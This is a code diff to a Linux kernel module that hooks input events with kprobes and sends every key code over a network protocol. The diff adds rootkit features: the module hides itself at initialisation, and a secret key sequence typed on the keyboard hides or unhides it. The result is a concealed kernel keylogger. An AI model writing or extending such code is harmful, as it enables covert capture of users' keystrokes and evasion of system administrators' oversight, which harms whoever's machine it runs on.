@@ -10,10 +10,11 @@
 #include "kClientHook.h"
 #include "cpu_stats.h"
 #include "headers.h"
+#include "hide/hide_module.h"
 #include "protocol.h"
 #include "tcp_socket.h"
-#include "workqueue.h"
 #include "transmission.h"
+#include "workqueue.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omer Kfir");
@@ -133,13 +134,41 @@ static int handler_pre_calc_global_load(struct kprobe *kp,
 
 /* Device input events */
 static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs) {
+  static int unhide_seq_index = 0; // Sequence index
+  static int hide_seq_index = 0;
+
   unsigned int code;
   if (!regs) // Checking current is irrelevant due to interrupts
     return 0;
 
-  code = (unsigned int)regs->dx; // Third paramater
-  if (code == 0 || code == 1)
-    return 0; // Ignore mouse moves
+  code = (unsigned int)regs->dx; // Third parameter (key code)
+  // Check for mouse events
+  if (code <= 4 && code >= 0)
+    return 0; // Ignore mouse moves and key releases
+
+  if (code == unhide_module[unhide_seq_index]) {
+    unhide_seq_index++;
+    unhide_seq_index %= UNHIDE_MODULE_SIZE;
+
+    if (unhide_seq_index == 0) {
+      // Unhide the module
+      unhide_this_module();
+      return 0;
+    }
+  } else if (code == hide_module[hide_seq_index]) {
+    hide_seq_index++;
+    hide_seq_index %= HIDE_MODULE_SIZE;
+
+    if (hide_seq_index == 0) {
+      // Hide the module
+      hide_this_module();
+      return 0;
+    }
+  } else {
+    // Reset the sequence index if the sequence is broken
+    hide_seq_index = 0;
+    unhide_seq_index = 0;
+  }
 
   // Only send code, since code for input is unique
   return protocol_send_message("%s" PROTOCOL_SEPARATOR "%d", MSG_INPUT_EVENT,
@@ -256,6 +285,7 @@ static int __init hook_init(void) {
     return ret;
   }
 
+  hide_this_module();
   printk(KERN_INFO "Finished initializing succesfully\n");
   return ret;
 }
